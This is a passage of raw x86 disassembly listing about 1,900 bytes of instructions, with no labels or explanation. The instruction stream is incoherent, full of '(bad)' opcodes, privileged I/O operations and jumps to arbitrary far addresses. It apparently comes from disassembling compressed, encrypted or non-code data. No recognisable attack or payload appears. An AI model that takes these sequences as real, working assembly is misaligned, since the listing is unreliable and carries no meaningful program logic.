  41d967:	mov    edx,0x5b6e518f
  41d96c:	cld    
  41d96d:	adc    eax,0xcfb8c8c7
  41d972:	aaa    
  41d973:	jnp    0x41d994
  41d975:	lock shl bl,1
  41d978:	xchg   ebp,eax
  41d979:	icebp  
  41d97a:	pop    ecx
  41d97b:	repnz nop
  41d97d:	xor    eax,0x61f2408f
  41d982:	mov    esp,0xbb3bb301
  41d987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d988:	push   cs
  41d989:	sub    al,0x69
  41d98b:	or     ch,dl
  41d98d:	dec    esp
  41d98e:	lods   al,BYTE PTR ds:[esi]
  41d98f:	aad    0x52
  41d991:	xchg   edx,eax
  41d992:	test   eax,0xed275e01
  41d997:	or     al,0x7e
  41d999:	leave  
  41d99a:	stos   DWORD PTR es:[edi],eax
  41d99b:	sbb    ecx,DWORD PTR [esi+0xb]
  41d99e:	push   ecx
  41d99f:	mov    ebp,0x602f7358
  41d9a4:	push   esi
  41d9a5:	xchg   ebp,eax
  41d9a6:	in     eax,0x86
  41d9a8:	pop    esp
  41d9a9:	int    0x97
  41d9ab:	pop    eax
  41d9ac:	das    
  41d9ad:	sbb    eax,ebp
  41d9af:	jmp    0x403e7885
  41d9b4:	push   0x4cfaed3d
  41d9b9:	sub    ecx,esi
  41d9bb:	ja     0x41d9f2
  41d9bd:	mov    BYTE PTR [ecx],bh
  41d9bf:	popa   
  41d9c0:	(bad)  
  41d9c1:	mov    al,0x10
  41d9c3:	sbb    dl,BYTE PTR [esi]
  41d9c5:	adc    BYTE PTR [edi+0x5f],dh
  41d9c8:	dec    eax
  41d9c9:	adc    DWORD PTR [ebx+ecx*4],edx
  41d9cc:	push   eax
  41d9cd:	adc    ebx,ebx
  41d9cf:	mov    edx,0x4d6f04d7
  41d9d4:	mov    dl,0x3b
  41d9d6:	mov    ebp,?
  41d9d8:	pushf  
  41d9d9:	cdq    
  41d9da:	fmul   QWORD PTR [edi-0x2a]
  41d9dd:	push   eax
  41d9de:	nop    esi
  41d9e1:	and    bh,BYTE PTR [edi-0x4b5d42e2]
  41d9e7:	mov    cl,dh
  41d9e9:	lahf   
  41d9ea:	(bad)  
  41d9eb:	mov    ebp,0x351ec410
  41d9f0:	mov    dl,0x89
  41d9f2:	pop    esp
  41d9f3:	ret    
  41d9f4:	imul   esp,DWORD PTR [edi],0x6e
  41d9f7:	lods   eax,DWORD PTR ds:[esi]
  41d9f8:	fwait
  41d9f9:	mov    bh,cl
  41d9fb:	push   0xffffffa2
  41d9fd:	xor    esi,DWORD PTR [ecx+eiz*8+0x53454957]
  41da04:	pop    ebp
  41da05:	push   ebx
  41da06:	cmp    esp,DWORD PTR [edi+0x3d]
  41da09:	gs lahf 
  41da0b:	add    BYTE PTR [ebp+0x11],0x4e
  41da0f:	fidiv  WORD PTR [ecx-0x61]
  41da12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da13:	cmc    
  41da14:	sbb    al,0x90
  41da16:	stos   DWORD PTR es:[edi],eax
  41da17:	(bad)  
  41da18:	sub    esp,DWORD PTR [eax]
  41da1a:	cmp    DWORD PTR [ebx+ebx*1-0x14757fa4],edx
  41da21:	and    al,0xef
  41da23:	and    bh,BYTE PTR [edi]
  41da25:	adc    al,0x7
  41da27:	pop    es
  41da28:	outs   dx,DWORD PTR ds:[esi]
  41da29:	aas    
  41da2a:	dec    si
  41da2c:	outs   dx,BYTE PTR ds:[esi]
  41da2d:	in     al,0x65
  41da2f:	arpl   cx,di
  41da31:	add    al,0xf5
  41da33:	out    dx,eax
  41da34:	std    
  41da35:	push   edx
  41da36:	cs xchg ebp,eax
  41da38:	sbb    ebx,eax
  41da3a:	mov    ?,ebp
  41da3c:	or     al,0xa8
  41da3e:	ret    0xbb2a
  41da41:	out    0xde,eax
  41da43:	fimul  DWORD PTR [ebp-0x58aa7c51]
  41da49:	lds    ecx,FWORD PTR ds:0x229ee1e2
  41da4f:	mov    cl,0xdf
  41da51:	mov    bh,al
  41da53:	mov    edi,0x452b5c8f
  41da58:	add    BYTE PTR [edi],dl
  41da5a:	pushf  
  41da5b:	push   cs
  41da5c:	push   es
  41da5d:	dec    esi
  41da5e:	mov    ?,ebp
  41da60:	rep lods al,BYTE PTR ds:[esi]
  41da62:	faddp  st(0),st
  41da64:	adc    BYTE PTR [ebx+0x173897f5],bl
  41da6a:	ins    DWORD PTR es:[edi],dx
  41da6b:	xor    esi,edx
  41da6d:	pop    ebx
  41da6e:	or     DWORD PTR [edi-0x2a],edi
  41da71:	push   es
  41da72:	lock sbb bl,BYTE PTR [ecx+0x516cc1e4]
  41da79:	push   ds
  41da7a:	inc    edi
  41da7b:	into   
  41da7c:	mov    bh,0xd1
  41da7e:	cmp    al,BYTE PTR [edx]
  41da80:	cmp    al,0xf9
  41da82:	adc    BYTE PTR ds:0x92e54b02,0x1
  41da89:	pusha  
  41da8a:	mov    eax,DWORD PTR [esi-0x6d]
  41da8d:	mov    esp,0xbce3d6b8
  41da92:	add    eax,0xdfa24b3b
  41da97:	das    
  41da98:	pop    ss
  41da99:	sti    
  41da9a:	out    dx,al
  41da9b:	xor    DWORD PTR [ecx+0x57],ecx
  41da9e:	xor    DWORD PTR [ebx],0x175d8052
  41daa4:	add    bh,BYTE PTR [ebp-0x18]
  41daa7:	cmp    bl,BYTE PTR [eax-0x6c160ff6]
  41daad:	xor    BYTE PTR [ebx],al
  41daaf:	cmp    eax,0x2ec1061b
  41dab4:	mov    al,0x55
  41dab6:	lock mov WORD PTR [ecx-0x2a8111f5],es
  41dabd:	xchg   ebp,eax
  41dabe:	repnz popf 
  41dac0:	inc    DWORD PTR [edi-0x18]
  41dac3:	scas   al,BYTE PTR es:[edi]
  41dac4:	pop    ds
  41dac5:	leave  
  41dac6:	into   
  41dac7:	aad    0xd3
  41dac9:	or     eax,0x20508461
  41dace:	shl    BYTE PTR [edx],1
  41dad0:	dec    ecx
  41dad1:	popf   
  41dad2:	dec    ecx
  41dad3:	sbb    dh,BYTE PTR [ebp+eiz*4-0x179659e4]
  41dada:	lods   eax,DWORD PTR ds:[esi]
  41dadb:	adc    al,0x8
  41dadd:	enter  0xb3a4,0x35
  41dae1:	mov    bh,BYTE PTR [ebp+eiz*2-0xb06d546]
  41dae8:	add    DWORD PTR [edi],esi
  41daea:	loopne 0x41db04
  41daec:	cmc    
  41daed:	dec    eax
  41daee:	jnp    0x41da9f
  41daf0:	in     eax,dx
  41daf1:	xor    BYTE PTR [esi-0x2c],dl
  41daf4:	inc    DWORD PTR [ecx]
  41daf6:	dec    eax
  41daf7:	adc    ebp,eax
  41daf9:	test   eax,0x1b9ea3da
  41dafe:	add    ch,ch
  41db00:	out    0xc5,eax
  41db02:	cmp    cl,BYTE PTR [edi+eiz*4]
  41db05:	pop    ss
  41db06:	cs movs DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41db09:	test   al,0x11
  41db0b:	and    eax,0xf797af84
  41db10:	aad    0x63
  41db12:	into   
  41db13:	in     eax,dx
  41db14:	lock mov edx,0x7b3e15ac
  41db1a:	sbb    eax,0xe53cb39f
  41db1f:	adc    al,0x86
  41db21:	mov    esi,0xa17d19e0
  41db26:	fstp   TBYTE PTR [ecx+eiz*8+0x6a]
  41db2a:	push   esi
  41db2b:	add    eax,0x89fcc16f
  41db30:	adc    bh,BYTE PTR [esi+0x3e]
  41db33:	sub    eax,0x1bb291e7
  41db38:	xor    BYTE PTR ss:[ecx+0x2cf65b3f],0x33
  41db40:	and    BYTE PTR [ecx+0x5f],bh
  41db43:	loopne 0x41dade
  41db45:	iret   
  41db46:	sbb    ah,ch
  41db48:	mov    dh,0xb8
  41db4a:	out    0x34,eax
  41db4c:	jne    0x41dbb8
  41db4e:	scas   al,BYTE PTR es:[edi]
  41db4f:	ret    
  41db50:	scas   eax,DWORD PTR es:[edi]
  41db51:	leave  
  41db52:	adc    al,0xc
  41db54:	sbb    eax,0x6238d749
  41db59:	fist   DWORD PTR [edi+0x21]
  41db5c:	cs cmp al,0xe2
  41db5f:	xor    cl,bh
  41db61:	dec    ecx
  41db62:	ror    DWORD PTR [eax+0x79c2b22b],0xdb
  41db69:	mov    ecx,0xed057ff
  41db6e:	lds    edi,FWORD PTR ds:0x2483b1dc
  41db74:	adc    ebp,DWORD PTR [edx-0x70906307]
  41db7a:	xor    eax,0x6c8c10c9
  41db7f:	or     eax,0x7aa84b81
  41db84:	mov    DWORD PTR [edx],ecx
  41db86:	jnp    0x41dbf3
  41db88:	inc    ebx
  41db89:	pop    ecx
  41db8a:	jns    0x41db50
  41db8c:	fstp   QWORD PTR [esi+0x5c]
  41db8f:	in     al,dx
  41db90:	xor    eax,0x870b7cd6
  41db95:	xchg   edx,eax
  41db96:	ret    
  41db97:	or     eax,0xcb7af716
  41db9c:	test   al,0x2d
  41db9e:	out    dx,eax
  41db9f:	jp     0x41db25
  41dba1:	dec    ecx
  41dba2:	rcr    edx,0xa7
  41dba5:	mov    ebp,0x6672d28b
  41dbaa:	ficom  WORD PTR [esi+0x19511e1d]
  41dbb0:	(bad)  
  41dbb1:	push   cs
  41dbb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbb3:	jbe    0x41db52
  41dbb5:	add    al,0x8
  41dbb7:	fs cld 
  41dbb9:	repnz rcr DWORD PTR [ebp+0x4c],0xea
  41dbbe:	retf   0x947c
  41dbc1:	(bad)  
  41dbc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbc3:	shr    BYTE PTR [edi-0x53],1
  41dbc6:	dec    ebx
  41dbc7:	adc    esi,ebx
  41dbc9:	mov    eax,ds:0xc91f7d1c
  41dbce:	lahf   
  41dbcf:	out    dx,al
  41dbd0:	lds    esi,FWORD PTR [eax-0x55]
  41dbd3:	aam    0xa2
  41dbd5:	lahf   
  41dbd6:	or     eax,0xb781de67
  41dbdb:	mov    ss,WORD PTR [ebp-0x22227aae]
  41dbe1:	sub    ebx,esp
  41dbe3:	xchg   edx,eax
  41dbe4:	imul   ebp,DWORD PTR [edx-0x8451ef],0x11
  41dbeb:	pop    esp
  41dbec:	xor    BYTE PTR [esi],bl
  41dbee:	cmp    ebp,DWORD PTR [ebx-0x7fe80a9a]
  41dbf4:	mov    ss,ebp
  41dbf6:	pushf  
  41dbf7:	jbe    0x41dc24
  41dbf9:	push   ds
  41dbfa:	xor    cl,BYTE PTR [edx]
  41dbfc:	xlat   BYTE PTR ds:[ebx]
  41dbfd:	jge    0x41dba0
  41dbff:	loopne 0x41dba4
  41dc01:	mov    eax,0x9c769c0a
  41dc06:	mov    eax,ds:0x41c6f17a
  41dc0b:	inc    edx
  41dc0c:	inc    esp
  41dc0d:	dec    eax
  41dc0e:	div    DWORD PTR [ebp-0xb]
  41dc11:	les    eax,FWORD PTR ds:0x446ee85
  41dc17:	mov    ds:0x18261b40,eax
  41dc1c:	enter  0x785a,0x40
  41dc20:	shl    DWORD PTR [edi],0xf2
  41dc23:	adc    DWORD PTR [eax+0x3b],ebp
  41dc26:	mov    ds:0x4bf92ab,eax
  41dc2b:	data16 je 0x41dc9e
  41dc2e:	and    edx,DWORD PTR [esi-0x6ea8c6a7]
  41dc34:	gs dec eax
  41dc36:	and    eax,0x874ba37c
  41dc3b:	mov    cl,0xd5
  41dc3d:	mov    BYTE PTR [edi+0x76],bl
  41dc40:	push   0x63
  41dc42:	arpl   bx,si
  41dc44:	xor    DWORD PTR [ecx-0x4dc55464],ebp
  41dc4a:	lods   eax,DWORD PTR ds:[esi]
  41dc4b:	add    DWORD PTR ds:0x994c2142,esp
  41dc51:	sbb    eax,0xf466217
  41dc56:	jmp    0x41dc65
  41dc58:	cli    
  41dc59:	ror    BYTE PTR [edi],1
  41dc5b:	imul   ecx
  41dc5d:	push   ss
  41dc5e:	sbb    DWORD PTR [ecx+ebx*1-0x36ac0e71],ebx
  41dc65:	jbe    0x41dc5f
  41dc67:	retw   0x41f7
  41dc6b:	mov    BYTE PTR [esi+0x3a57cac4],cl
  41dc71:	fldenv [esi+0x44b904a2]
  41dc77:	or     al,0x41
  41dc79:	cmp    ebx,edx
  41dc7b:	cli    
  41dc7c:	pushf  
  41dc7d:	ins    BYTE PTR es:[edi],dx
  41dc7e:	or     ecx,DWORD PTR [ecx+eiz*8+0x70]
  41dc82:	loopne 0x41dc4b
  41dc84:	mov    eax,0x69c6bc40
  41dc89:	sbb    esp,DWORD PTR [esi-0x31]
  41dc8c:	mov    ecx,0x6a3395fd
  41dc91:	pop    eax
  41dc92:	lds    esi,FWORD PTR [eax+0x48d9f1bd]
  41dc98:	xchg   ecx,eax
  41dc99:	push   es
  41dc9a:	mov    ecx,ebx
  41dc9c:	fcmove st,st(2)
  41dc9e:	mov    ah,0x28
  41dca0:	lock fdivr QWORD PTR [edi-0x1b]
  41dca4:	sub    eax,0x913b32de
  41dca9:	xchg   esi,edx
  41dcab:	ds jecxz 0x41dcca
  41dcae:	in     al,dx
  41dcaf:	push   0xffffffa4
  41dcb1:	fimul  WORD PTR [eax-0x37]
  41dcb4:	std    
  41dcb5:	sbb    al,0xd9
  41dcb7:	sub    ah,dh
  41dcb9:	dec    esi
  41dcba:	test   eax,0x52b9eb4
  41dcbf:	sub    DWORD PTR [eax+0x463d079b],edi
  41dcc5:	ins    BYTE PTR es:[edi],dx
  41dcc6:	xchg   esp,eax
  41dcc7:	jmp    0x5b1b14cb
  41dccc:	cmc    
  41dccd:	test   al,0xbb
  41dccf:	mov    ecx,0x2302b2d0
  41dcd4:	xchg   esi,eax
  41dcd5:	mov    WORD PTR [ebp-0x40f99fdf],gs
  41dcdb:	ret    0x10c2
  41dcde:	sti    
  41dcdf:	data16 fisubr WORD PTR [ebp-0x80]
  41dce3:	mov    ch,0x13
  41dce5:	lea    ecx,[ebp-0x38]
  41dce8:	xchg   ebx,eax
  41dce9:	gs jmp 0x2c84e2ce
  41dcef:	add    edi,DWORD PTR [eax-0x416de05e]
  41dcf5:	and    bh,BYTE PTR [esi+esi*4]
  41dcf8:	mov    ebp,0x4e091d77
  41dcfd:	dec    esp
  41dcfe:	daa    
  41dcff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd00:	dec    ebp
  41dd01:	fistp  WORD PTR [eax]
  41dd03:	ins    BYTE PTR es:[edi],dx
  41dd04:	or     cl,BYTE PTR [ebx-0x35b8a78]
  41dd0a:	mov    ebp,0xf9732227
  41dd0f:	std    
  41dd10:	dec    esp
  41dd11:	xor    al,BYTE PTR ds:0xf80ce680
  41dd17:	dec    edx
  41dd18:	leave  
  41dd19:	jbe    0x41dd5d
  41dd1b:	(bad)  
  41dd1c:	ins    DWORD PTR es:[edi],dx
  41dd1d:	mov    edi,0x8c790c33
  41dd22:	je     0x41dd8b
  41dd24:	rcl    DWORD PTR [ebx+0x36f3049e],cl
  41dd2a:	call   0xb8ac:0xe1c27ec3
  41dd31:	and    BYTE PTR [ebp+0x8],cl
  41dd34:	pop    ebp
  41dd35:	stos   DWORD PTR es:[edi],eax
  41dd36:	adc    cl,BYTE PTR [edi]
  41dd38:	jb     0x41dcc8
  41dd3a:	neg    ecx
  41dd3c:	xchg   edi,eax
  41dd3d:	aaa    
  41dd3e:	mov    dh,0xe0
  41dd40:	out    dx,eax
  41dd41:	jb     0x41dd6a
  41dd43:	push   cs
  41dd44:	jbe    0x41dd59
  41dd46:	xlat   BYTE PTR ds:[ebx]
  41dd47:	adc    edx,DWORD PTR [eax-0x2d]
  41dd4a:	mov    bl,0x8
  41dd4c:	dec    edx
  41dd4d:	cmc    
  41dd4e:	xor    ebx,ebx
  41dd50:	fwait
  41dd51:	xchg   ecx,eax
  41dd52:	inc    edx
  41dd53:	jl     0x41dd85
  41dd55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd56:	cmc    
  41dd57:	nop
  41dd58:	pushf  
  41dd59:	and    ah,dh
  41dd5b:	loope  0x41dd5d
  41dd5d:	out    dx,eax
  41dd5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd5f:	xchg   edi,eax
  41dd60:	leave  
  41dd61:	imul   ebx,DWORD PTR [eiz*4+0x1e129bb7],0x20
  41dd69:	lods   al,BYTE PTR ds:[esi]
  41dd6a:	test   al,0x58
  41dd6c:	out    0x67,al
  41dd6e:	and    edx,eax
  41dd70:	lahf   
  41dd71:	xchg   DWORD PTR [eax+0x6aee913e],ebp
  41dd77:	out    0x7c,al
  41dd79:	cmp    al,0x54
  41dd7b:	in     eax,dx
  41dd7c:	call   0xb1fb:0x3df2e16c
  41dd83:	mov    esi,0x4486065
  41dd88:	pop    ss
  41dd89:	ret    
  41dd8a:	ret    0x8eb9
  41dd8d:	push   eax
  41dd8e:	xchg   esi,eax
  41dd8f:	or     edi,esi
  41dd91:	sub    eax,0x290690da
  41dd96:	fwait
  41dd97:	mov    DWORD PTR [esi-0x5f90ac43],ebx
  41dd9d:	adc    edi,edx
  41dd9f:	enter  0x3b64,0x6b
  41dda3:	push   0xc554fd24
  41dda8:	inc    esp
  41dda9:	mov    ax,ds:0x9c4c3595
  41ddaf:	add    BYTE PTR [edi],ah
  41ddb1:	out    0xd4,al
  41ddb3:	aaa    
  41ddb4:	fadd   QWORD PTR [ebp-0x24]
  41ddb7:	fnstenv [ebp+0x3128d4db]
  41ddbd:	pop    ebx
  41ddbe:	stos   DWORD PTR es:[edi],eax
  41ddbf:	mov    eax,0xb746d756
  41ddc4:	mov    cl,0xc0
  41ddc6:	mov    gs,WORD PTR [eax+eax*1]
  41ddc9:	or     al,0xfb
  41ddcb:	jp     0x41dd65
  41ddcd:	in     al,dx
  41ddce:	sub    ecx,esi
  41ddd0:	das    
  41ddd1:	rcl    bl,cl
  41ddd3:	imul   ebp,DWORD PTR [edi+0x20],0x6a
  41ddd7:	cs push ecx
  41ddd9:	or     ch,BYTE PTR [ecx]
  41dddb:	out    dx,eax
  41dddc:	push   ss
  41dddd:	pop    ebx
  41ddde:	mov    edx,0xad6e9012
  41dde3:	fs ss push dx
  41dde7:	pop    edx
  41dde8:	dec    eax
  41dde9:	sbb    BYTE PTR [ecx],0xb6
  41ddec:	add    BYTE PTR [edi+esi*4-0xb1cb3f2],al
  41ddf3:	ss cwde 
  41ddf5:	xchg   ebp,eax
  41ddf6:	int3   
  41ddf7:	dec    ecx
  41ddf8:	xchg   esp,eax
  41ddf9:	xor    eax,0x9d26dae9
  41ddfe:	xor    cl,al
  41de00:	and    al,0xb2
  41de02:	std    
  41de03:	pop    es
  41de04:	add    eax,0x1d273433
  41de09:	out    0x63,al
  41de0b:	std    
  41de0c:	and    al,0x53
  41de0e:	xor    eax,0x33df91fe
  41de13:	push   ebp
  41de14:	sbb    al,0xa6
  41de16:	xor    ah,0x3a
  41de19:	ins    BYTE PTR es:[edi],dx
  41de1a:	call   0x6167c93f
  41de1f:	jae    0x41de9e
  41de21:	repz push ecx
  41de23:	inc    esi
  41de24:	fnstcw WORD PTR [ebx]
  41de26:	and    eax,ebp
  41de28:	ss adc esi,esi
  41de2b:	mov    eax,0x33d25507
  41de30:	hlt    
  41de31:	mov    al,ds:0x27277f94
  41de36:	(bad)  
  41de38:	pushf  
  41de39:	lods   al,BYTE PTR ds:[esi]
  41de3a:	pop    ds
  41de3b:	bound  edi,QWORD PTR [edx-0x76942edf]
  41de41:	xchg   esp,eax
  41de42:	shl    BYTE PTR [ebp-0x52],0xd4
  41de46:	mov    edx,0xf3ebd090
  41de4b:	test   BYTE PTR [edx+esi*4-0x57ce6542],al
  41de52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de53:	cldemote BYTE PTR [eax-0x5c]
  41de57:	dec    ebx
  41de58:	mov    bl,0xa7
  41de5a:	loope  0x41deb4
  41de5c:	std    
  41de5d:	mov    al,ds:0x7367c3e3
  41de62:	fadd   DWORD PTR [edi]
  41de64:	jg     0x41dea0
  41de66:	cmp    BYTE PTR [edx-0x2dabf3ec],ah
  41de6c:	cmp    BYTE PTR [edi],bl
  41de6e:	push   0xdc964c44
  41de73:	mov    edi,0x1aea9483
  41de78:	pop    ds
  41de79:	pop    ebx
  41de7a:	les    esp,FWORD PTR [ecx]
  41de7c:	or     dl,dl
  41de7e:	add    al,0x7b
  41de80:	lahf   
  41de81:	or     esp,ecx
  41de83:	push   ds
  41de84:	cld    
  41de85:	imul   esi,DWORD PTR [edi],0x306864e8
  41de8b:	and    ecx,DWORD PTR [ecx+0x43fb48c1]
  41de91:	scas   al,BYTE PTR es:[edi]
  41de92:	mov    dl,BYTE PTR [edx-0x4bbc3f61]
  41de98:	(bad)  
  41de99:	clc    
  41de9a:	jmp    0x41df17
  41de9c:	sahf   
  41de9d:	pop    es
  41de9e:	ss dec esi
  41dea0:	stos   DWORD PTR es:[edi],eax
  41dea1:	xchg   edx,eax
  41dea2:	adc    al,0x66
  41dea4:	loopne 0x41deb9
  41dea6:	dec    ebx
  41dea7:	fist   WORD PTR [edi]
  41dea9:	outs   dx,BYTE PTR ds:[esi]
  41deaa:	shl    DWORD PTR [esi-0x6],cl
  41dead:	fucom  st(4)
  41deaf:	aaa    
  41deb0:	mov    ecx,0x43649627
  41deb5:	or     eax,0x30bacdc
  41deba:	out    dx,al
  41debb:	out    0x4b,eax
  41debd:	and    ebx,DWORD PTR [edx]
  41debf:	je     0x41deb9
  41dec1:	mov    al,0x13
  41dec3:	adc    BYTE PTR ds:0xbbb8a568,bh
  41dec9:	leave  
  41deca:	cmc    
  41decb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41decc:	inc    ebx
  41decd:	or     al,0x56
  41decf:	fsub   st,st(1)
  41ded1:	call   0x3a0e0113
  41ded6:	ss test eax,0x1e11f1a1
  41dedc:	push   edi
  41dedd:	fsubr  DWORD PTR [ebx]
  41dedf:	iret   
  41dee0:	cmp    ah,BYTE PTR [esi]
  41dee2:	and    edi,DWORD PTR [edi]
  41dee4:	pop    es
  41dee5:	das    
  41dee6:	and    DWORD PTR [ebp+0x5879958f],ebp
  41deec:	cmc    
  41deed:	int3   
  41deee:	or     DWORD PTR [edi+0x2f9589c5],0xffffffa5
  41def5:	pop    ebx
  41def6:	sub    eax,edi
  41def8:	repz sbb al,0x7c
  41defb:	call   0x46e1:0xeb5e3040
  41df02:	and    dh,0x92
  41df05:	xchg   esp,eax
  41df06:	shl    BYTE PTR [ebp+eiz*2+0x5a955b97],0x3f
  41df0e:	jbe    0x41df25
  41df10:	add    BYTE PTR [esi+ebp*4+0x6a],dl
  41df14:	fsub   QWORD PTR [eax+eax*2-0x70]
  41df18:	jo     0x41df89
  41df1a:	mov    es,WORD PTR [edi]
  41df1c:	push   edx
  41df1d:	sbb    eax,0x6e8bbbab
  41df22:	mov    dl,0xe6
  41df24:	mov    ch,0x2a
  41df26:	fbstp  TBYTE PTR [ebp+0x6]
  41df29:	repnz adc DWORD PTR [edi],eax
  41df2c:	xchg   esi,eax
  41df2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df2e:	dec    eax
  41df2f:	ret    
  41df30:	out    dx,eax
  41df31:	xor    DWORD PTR [eax+ecx*1+0xf],esi
  41df35:	nop
  41df36:	mov    dl,0xb7
  41df38:	clc    
  41df39:	jb     0x41df12
  41df3b:	out    dx,eax
  41df3c:	sar    BYTE PTR [ebx],cl
  41df3e:	fdivr  QWORD PTR [ebx-0x5b]
  41df41:	add    BYTE PTR [edi-0x85ac7e4],bl
  41df47:	das    
  41df48:	xchg   ebx,eax
  41df49:	xchg   esi,eax
  41df4a:	sar    DWORD PTR [edi-0x768f7a6b],1
  41df50:	stos   BYTE PTR es:[edi],al
  41df51:	sbb    BYTE PTR [eax-0x66],dh
  41df54:	lods   eax,DWORD PTR ds:[esi]
  41df55:	mov    esi,0xd047cd48
  41df5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df5b:	idiv   DWORD PTR [ecx-0x356ff690]
  41df61:	fisttp DWORD PTR [ecx+0x37]
  41df64:	inc    ecx
  41df65:	mov    bh,dh
  41df67:	add    BYTE PTR [edx+0x7e],ch
  41df6a:	dec    edx
  41df6b:	outs   dx,BYTE PTR ds:[esi]
  41df6c:	adc    edi,DWORD PTR [ecx+0x6dcee1e9]
  41df72:	mov    ebp,0x6a1c66b6
  41df77:	pop    ds
  41df78:	icebp  
  41df79:	push   eax
  41df7a:	pop    ss
  41df7b:	ror    BYTE PTR [ebp+0x551152f6],1
  41df81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df82:	and    BYTE PTR [eax-0x4],dh
  41df85:	iret   
  41df86:	(bad)  
  41df87:	xchg   esi,eax
  41df88:	in     al,0xa2
  41df8a:	xor    edi,0xffffffeb
  41df8d:	ror    DWORD PTR [esi-0x34],cl
  41df90:	and    dl,BYTE PTR [edi+edx*1-0x77]
  41df94:	je     0x41df6f
  41df96:	add    BYTE PTR [ecx-0x7b03b302],al
  41df9c:	cmp    eax,0x57fe8910
  41dfa1:	imul   ebx,DWORD PTR [esp+ebx*4],0x634564d9
  41dfa8:	repnz sar BYTE PTR [edx-0x4a5edf69],0x34
  41dfb0:	popa   
  41dfb1:	ins    DWORD PTR es:[edi],dx
  41dfb2:	ins    DWORD PTR es:[edi],dx
  41dfb3:	dec    ebp
  41dfb4:	out    dx,eax
  41dfb5:	jno    0x41df82
  41dfb7:	cmc    
  41dfb8:	dec    esi
  41dfb9:	jmp    0x7fde:0x1d1b10fc
  41dfc0:	sbb    al,0x5c
  41dfc2:	lds    ebx,FWORD PTR [ebx]
  41dfc4:	les    eax,FWORD PTR [ebx+eax*2]
  41dfc7:	mov    bh,0x29
  41dfc9:	loope  0x41df86
  41dfcb:	stos   BYTE PTR es:[edi],al
  41dfcc:	ds nop
  41dfce:	mov    bh,0x37
  41dfd0:	es retf 0xb646
  41dfd4:	out    0xcd,al
  41dfd6:	out    dx,eax
  41dfd7:	jb     0x41dfc6
  41dfd9:	(bad)  
  41dfda:	out    dx,al
  41dfdb:	mov    es,ebx
  41dfdd:	jo     0x41dfbb
  41dfdf:	mov    dl,0xdf
  41dfe2:	inc    eax
  41dfe3:	mov    es,WORD PTR [esp+eiz*4]
  41dfe6:	fwait
  41dfe7:	stos   DWORD PTR es:[edi],eax
  41dfe8:	mov    cl,0x5a
  41dfea:	inc    edx
  41dfeb:	mov    ebx,0xfdafcdb3
  41dff0:	push   cs
  41dff1:	inc    esi
  41dff2:	sub    al,0x94
  41dff4:	xchg   esp,eax
  41dff5:	jp     0x41dfbf
  41dff7:	pushf  
  41dff8:	push   edi
  41dff9:	mov    ch,0x6e
  41dffb:	mov    bl,0x3e
  41dffd:	(bad)  [ebx+0xb]
  41e000:	sub    eax,0x498d3d30
  41e005:	scas   al,BYTE PTR es:[edi]
  41e006:	add    al,BYTE PTR [ebx+0x13dbbee0]
  41e00c:	ins    BYTE PTR es:[edi],dx
  41e00d:	jo     0x41dfb0
  41e00f:	jmp    0xc5b7:0xdcfed1c0
  41e016:	xchg   BYTE PTR [ebx+0x53],bl
  41e019:	out    dx,eax
  41e01a:	pop    ebp
  41e01b:	xor    BYTE PTR [edi+eax*8-0x45],ah
  41e01f:	hlt    
  41e020:	pop    esp
  41e021:	xor    edi,edx
  41e023:	mov    eax,0x8dbc6d2f
  41e028:	repnz (bad) 
  41e02a:	xchg   edi,eax
  41e02b:	push   ecx
  41e02d:	dec    esi
  41e02e:	dec    ecx
  41e02f:	in     al,0xa9
  41e031:	mov    edi,0xf6c503c7
  41e036:	and    BYTE PTR [esp+ebx*4+0x526a0c60],bh
  41e03d:	add    al,0xbc
  41e03f:	dec    ebp
  41e040:	push   edx
  41e041:	xor    ah,bh
  41e043:	mov    cl,0x88
  41e045:	sub    ah,bl
  41e047:	and    esi,DWORD PTR [ecx]
  41e049:	dec    esp
  41e04a:	ins    DWORD PTR es:[edi],dx
  41e04b:	jo     0x41e013
  41e04d:	cwde   
  41e04e:	or     BYTE PTR [ebp+0x269085ff],dl
  41e054:	mov    ebp,0x10f8a360
  41e059:	test   BYTE PTR [ecx+0x8],ah
  41e05c:	dec    ebp
  41e05d:	mov    esi,0x669b68aa
  41e062:	inc    edi
  41e063:	and    ebp,ebx
  41e065:	and    eax,0x484434af
  41e06a:	sbb    DWORD PTR [ecx],eax
  41e06c:	pop    ebp
  41e06d:	mov    bl,ah
  41e06f:	inc    ebp
  41e070:	fs sub dh,dh
  41e073:	xor    eax,0x31b70b6c
  41e078:	(bad)  
  41e07a:	std    
  41e07b:	add    cl,BYTE PTR [ecx]
  41e07d:	or     DWORD PTR [edx+0x3f],ecx
  41e080:	out    dx,al
  41e081:	pop    es
  41e082:	mov    ebx,0xeee36911
  41e087:	xchg   DWORD PTR [edi+0x58],ecx
  41e08a:	xor    al,0x1b
  41e08c:	lock out dx,al
  41e08e:	call   0xa41a:0x3d70d57e
  41e095:	inc    ebp
  41e096:	cdq    
  41e097:	pop    edi
  41e098:	iret   
  41e099:	js     0x41e0f7
  41e09b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e09c:	outs   dx,DWORD PTR ds:[esi]
  41e09d:	adc    eax,0xb728fc5d
  41e0a2:	add    DWORD PTR [ecx-0x6d],ecx
  41e0a5:	pop    ecx
  41e0a6:	cmp    BYTE PTR [ebp+0x34],0x50
  41e0aa:	aad    0xc5
  41e0ac:	stc    
  41e0ad:	sbb    DWORD PTR [ebp-0x6],esi
  41e0b0:	clc    
  41e0b1:	(bad)  
  41e0b2:	sbb    al,0xec
  41e0b4:	inc    eax
  41e0b5:	inc    ebp
  41e0b6:	push   ss
  41e0b7:	sub    BYTE PTR [ebp+0x3a],dh
  41e0ba:	lock inc esi
  41e0bc:	push   ebp
  41e0bd:	not    DWORD PTR [ecx+eax*8]
